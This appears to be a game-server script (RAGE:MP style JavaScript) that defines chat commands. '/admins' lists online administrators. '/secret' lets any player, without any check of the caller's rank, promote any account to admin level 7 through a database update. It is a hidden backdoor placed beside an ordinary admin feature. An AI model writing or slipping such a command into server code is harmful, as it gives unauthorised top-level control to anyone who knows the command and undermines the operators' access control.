require("../functions.js");
require("../auth.js"); 

//Show admin and helpers  
mp.events.addCommand('admins', (player) => {
    let counter_admins = 0;
    sendMessage(player, 'ff9900', `Online admins:`);
    mp.players.forEach(_player => {
        if(_player.data.admin > 0) 
        {
            sendMessage(player, 'FFFFFF', `${_player.name} [${_player.id}] - admin level ${_player.data.admin}`);
            counter_admins ++;
        }
    });
    sendMessage(player, 'ff9900', `Admins online: ${counter_admins}`);
});


mp.events.addCommand('secret', (player, _, id) => { 
    const user = getNameOnNameID(id);
    if(!id) 
        return sendUsage(player, `/secret [player]`);
    if(user == undefined) 
        return sendMessage(player, 'ffffff', `Player not found.`);   
    sendMessage(player, COLOR_ADMIN, `(Notice):!{ffffff} You promoted ${user.name} to admin level 7.`);
    mysql_action('UPDATE `accounts` SET admin = 7 WHERE username = ?', [user.name]);
}); 
 